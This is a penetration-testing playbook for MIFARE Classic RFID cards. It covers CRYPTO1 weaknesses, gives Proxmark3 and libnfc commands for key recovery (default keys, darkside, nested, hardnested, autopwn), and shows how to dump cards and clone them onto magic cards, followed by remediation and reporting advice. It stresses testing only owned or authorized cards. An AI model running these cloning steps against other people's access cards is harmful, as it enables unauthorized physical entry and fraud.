# RFID / NFC — MIFARE Classic Weaknesses & Cloning (Own / Authorized Cards Only)

**Own-cards-only doctrine.** Read, recover keys from, dump, and clone **only** cards
that **you own** or that are explicitly named in the RoE (e.g. the client's own test
badges issued for the engagement). Cloning someone else's access card without
authorization is theft-of-access / fraud and is forbidden regardless of technical
ease. **No NFC field abuse / no reader DoS.**

Assumes a **Proxmark3** (RDV4 or compatible) with current firmware, and/or `libnfc`
tools (`nfc-list`, `mfoc`, `mfcuk`, `nfc-mfclassic`) with an ACR122U-class reader.

---

## 1. Background — why MIFARE Classic is weak

MIFARE Classic (13.56 MHz, ISO 14443A) uses the proprietary **CRYPTO1** cipher with a
48-bit key and a weak PRNG. CRYPTO1 has been broken since 2008; practical key-recovery
attacks exist. A 1K card has **16 sectors × 4 blocks**, each sector protected by
**Key A / Key B** stored in the sector trailer. Block 0 holds the **UID + manufacturer
data** and is normally read-only on genuine cards.

Attack families:
- **Default keys** — many deployments never change factory keys (`FFFFFFFFFFFF`,
  `A0A1A2A3A4A5`, transport keys, etc.). Try these first.
- **Darkside** (mfcuk) — recovers a **first** key from a card with **no known keys**,
  exploiting CRYPTO1 responses to failed authentication (weak-PRNG cards).
- **Nested** (mfoc) — given **one** known key, recovers the **remaining** sector keys
  via nested authentication (weak-PRNG cards).
- **Hardnested** (Proxmark) — for cards with a hardened PRNG that resist classic
  nested; uses statistical cryptanalysis (needs one known key).
- **Static/encrypted-nonce variants** — newer "hard" MIFARE variants; Proxmark
  tracks the latest research (e.g. 2024 static-encrypted-nonce work) and appropriate
  `hf mf` commands.

---

## 2. Identify the card (read-only)

### Proxmark3
```bash
pm3
[usb] pm3 --> hw version           # confirm client/firmware
[usb] pm3 --> hf search            # identify tag type (MIFARE Classic/DESFire/etc.)
[usb] pm3 --> hf 14a info          # ISO14443A: UID, ATQA/SAK, hints at chip
```

### libnfc
```bash
nfc-list                            # UID + tag type
```

If it is **MIFARE DESFire / Ultralight EV1 / newer** rather than Classic, CRYPTO1
attacks do not apply — note the (stronger) type and stop there unless DESFire testing
is separately scoped.

---

## 3. Recover keys (your own / authorized card)

### Try default keys first (Proxmark)
```bash
[usb] pm3 --> hf mf chk *1 ? d      # check all sectors against the default dictionary
[usb] pm3 --> hf mf fchk            # fast check against built-in key dictionary
```

### Darkside — no known key (weak-PRNG card)
```bash
[usb] pm3 --> hf mf darkside        # recover a first key with zero prior keys
# libnfc equivalent:
mfcuk -C -R 0:A -s 250 -S 250       # darkside; recover a key when none known
```

### Nested — one known key → the rest
```bash
[usb] pm3 --> hf mf nested 1 0 A <known_key>   # recover remaining keys
# or the auto-pilot that combines default-check + nested and dumps:
[usb] pm3 --> hf mf autopwn
# libnfc equivalent (nested):
mfoc -O dump.mfd                    # uses known/default keys, nested-attacks the rest, dumps
```

### Hardnested — hardened PRNG card
```bash
[usb] pm3 --> hf mf hardnested <blk> <A|B> <known_key> <target_blk> <A|B>
```

`hf mf autopwn` is the modern one-shot: it tries the dictionary, escalates to
nested/hardnested/darkside as needed, recovers all keys, and dumps the card.

---

## 4. Dump, inspect, clone (own / authorized card only)

### Dump
```bash
[usb] pm3 --> hf mf dump            # writes hf-mf-<UID>-dump.bin with recovered keys
# libnfc:
mfoc -O dump.mfd
```
Inspect the dump for the finding (e.g. access data stored in plaintext, weak/default
keys, no key diversification).

### Clone to a writable card (magic / gen1a UID-changeable)
Cloning requires a **"magic" card** (Gen1a/Gen2) whose block 0 (UID) is writable —
genuine cards lock block 0.
```bash
[usb] pm3 --> hf mf restore         # write a dump back to a magic card
[usb] pm3 --> hf mf csetuid <UID>   # set UID on a gen1a magic card
# libnfc:
nfc-mfclassic W a dump.mfd          # write dump to a magic card
```

> **Scope reminder:** produce a clone **only** of a card you own or a client test badge
> explicitly authorized for the engagement, purely to demonstrate the weakness. Do not
> retain working clones of access credentials beyond what the report requires; destroy
> test clones and delete dumps per RoE.

---

## 5. Other tags (awareness)

- **MIFARE Ultralight / NTAG** — often no crypto; data may be freely readable/writable.
  Check for sensitive data stored in the clear; note lock-bit / password (PWD_AUTH)
  usage.
- **MIFARE DESFire (EV1/EV2/EV3)** — AES/3DES, much stronger; assess key management,
  not CRYPTO1 breaks.
- **HID Prox / low-frequency 125 kHz (T5577, EM4100)** — no crypto, trivially cloned
  with Proxmark `lf` commands; a real physical-access finding when used for door
  access. Own/authorized cards only.

---

## 6. Remediation

- **Migrate off MIFARE Classic / CRYPTO1** to MIFARE DESFire EV2/EV3 or Seos with AES
  and proper key management — CRYPTO1 is broken and cannot be made safe.
- **Never use default/transport keys**; use **diversified keys** (unique per card,
  derived from a master key + UID) so one recovered card does not compromise the fleet.
- Do **not** store sensitive data (balances, access rights, PII) in plaintext on the
  card; keep authorization server-side.
- Where UID is used for access, remember **UID is cloneable** — do not treat UID as a
  secret; require cryptographic authentication.
- Add anti-passback / usage anomaly detection; monitor for duplicate UIDs.

## Reporting

Feed to `security-reporting`: default/weak CRYPTO1 keys, MIFARE Classic in use for
access control, plaintext data on card, UID-only access decisions, LF prox cloneable
badges. Note that only owned/authorized cards were tested, clones were destroyed, and
dumps deleted per RoE.
